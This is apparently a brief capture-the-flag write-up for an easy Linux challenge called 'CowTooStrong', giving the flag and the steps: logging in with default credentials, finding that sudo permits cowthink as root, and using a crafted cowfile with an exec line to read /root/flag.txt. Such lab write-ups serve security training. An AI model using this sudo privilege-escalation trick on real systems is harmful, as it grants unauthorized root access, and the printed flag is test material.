# 38 — CowTooStrong

**Category:** Linux  |  **Difficulty:** Easy

**Flag:** `NCFA{p0w3rful_c0w}`

## How I found the flag

- SSH ncfa/ncfa; sudo -l (pw ncfa) allows (root) /usr/games/cowthink.
- cowthink is cowsay (perl) -> GTFOBins code exec via a cowfile.
- Cowfile: exec "cat /root/flag.txt";.
- sudo cowthink -f x.cow -> flag.

